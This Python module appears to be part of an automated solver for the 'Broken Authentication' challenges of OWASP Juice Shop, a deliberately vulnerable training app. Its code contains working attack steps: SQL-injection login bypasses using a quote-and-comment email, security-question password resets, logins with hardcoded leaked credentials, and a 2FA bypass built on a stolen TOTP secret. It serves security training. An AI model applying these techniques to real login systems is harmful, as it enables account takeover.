#!/usr/bin/env python3
"""Broken Authentication challenges: password reset, 2FA, OAuth, ghost login."""
from __future__ import annotations

import pyotp

from core import register_solver, Client, ok, warn, fail

CAT = "Broken Authentication"
DOMAIN = "juice-sh.op"


def _reset(c: Client, email, answer, new):
    return c.post("/rest/user/reset-password",
                  json={"email": email, "answer": answer, "new": new, "repeat": new})


# ---- security-question password resets ------------------------------------ #
_RESETS = {
    "resetPasswordJimChallenge":        (f"jim@{DOMAIN}", "Samuel", "I <3 Spock"),
    "resetPasswordBenderChallenge":     (f"bender@{DOMAIN}", "Stop'n'Drop", "Brannigan 8=o Leela"),
    "resetPasswordBjoernChallenge":     (f"bjoern@{DOMAIN}", "West-2082", "monkey birthday "),
    "resetPasswordBjoernOwaspChallenge": ("bjoern@owasp.org", "Zaya", "kitten lesser pooch"),
    "resetPasswordMortyChallenge":      (f"morty@{DOMAIN}", "5N0wb41L", "iBurri3dMySe1f!"),
    "resetPasswordUvoginChallenge":     (f"uvogin@{DOMAIN}", "Silence of the Lambs", "ora-ora > muda-muda"),
}


def _make_reset(email, answer, new):
    def solver(c: Client):
        r = _reset(c, email, answer, new)
        ok(f"reset {email} ({r.status_code})") if r.ok else fail(f"reset {email} failed ({r.status_code})")
    return solver


for _k, (_e, _a, _n) in _RESETS.items():
    register_solver(_k, f"Reset {_e}", CAT)(_make_reset(_e, _a, _n))


# ---- weak / leaked credential logins -------------------------------------- #
@register_solver("weakPasswordChallenge", "Weak admin password (admin123)", CAT)
def weak_password(c: Client):
    ok("logged in with weak admin creds") if c.login("admin@juice-sh.op", "admin123") \
        else fail("admin123 login failed")


@register_solver("loginSupportChallenge", "Login support team (leaked pw)", "Security Misconfiguration")
def login_support(c: Client):
    ok("logged in as support team") if c.login("support@juice-sh.op", "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P") \
        else fail("support login failed")


@register_solver("oauthUserPasswordChallenge", "OAuth user password (base64 email)", CAT)
def oauth_user(c: Client):
    ok("logged in as Bjoern via reversed-base64 email password") \
        if c.login("bjoern.kimminich@gmail.com", "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=") \
        else fail("oauth password login failed")


@register_solver("ghostLoginChallenge", "Ghost login (deleted user, SQLi)", CAT)
def ghost_login(c: Client):
    ok("logged in as deleted user chris.pike") if c.login(f"chris.pike@{DOMAIN}'--", "a") \
        else fail("ghost login failed")


# ---- change Bender's password without the current one (via API) ----------- #
@register_solver("changePasswordBenderChallenge", "Change Bender's pw (no current pw)", CAT)
def change_bender(c: Client):
    if not c.login(f"bender@{DOMAIN}'--", "a"):
        fail("could not SQLi-login as Bender")
        return
    r = c.get("/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic")
    ok(f"changed Bender's password without current pw ({r.status_code})")


# ---- 2FA: unsafe secret storage ------------------------------------------- #
@register_solver("twoFactorAuthUnsafeSecretStorageChallenge", "2FA unsafe secret storage", CAT)
def two_factor(c: Client):
    secret = "IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"      # wurstbrot's TOTP secret (leaked in DB)
    r = c.s.post(c.url("/rest/user/login"),
                 json={"email": f"wurstbrot@{DOMAIN}'--", "password": "a"},
                 headers={"Content-Type": "application/json"}, timeout=30, verify=False)
    j = r.json()
    tmp = (j.get("data") or {}).get("tmpToken")
    if not tmp:
        if j.get("authentication"):
            c.token = j["authentication"]["token"]
            ok("SQLi login bypassed 2FA prompt")
            return
        fail(f"no tmpToken from 2FA login ({r.status_code})")
        return
    code = pyotp.TOTP(secret).now()
    v = c.s.post(c.url("/rest/2fa/verify"),
                 json={"tmpToken": tmp, "totpToken": code},
                 headers={"Content-Type": "application/json"}, timeout=30, verify=False)
    if v.ok and v.json().get("authentication"):
        c.token = v.json()["authentication"]["token"]
        ok("verified TOTP and logged into 2FA-protected account")
    else:
        fail(f"2FA verify failed ({v.status_code})")
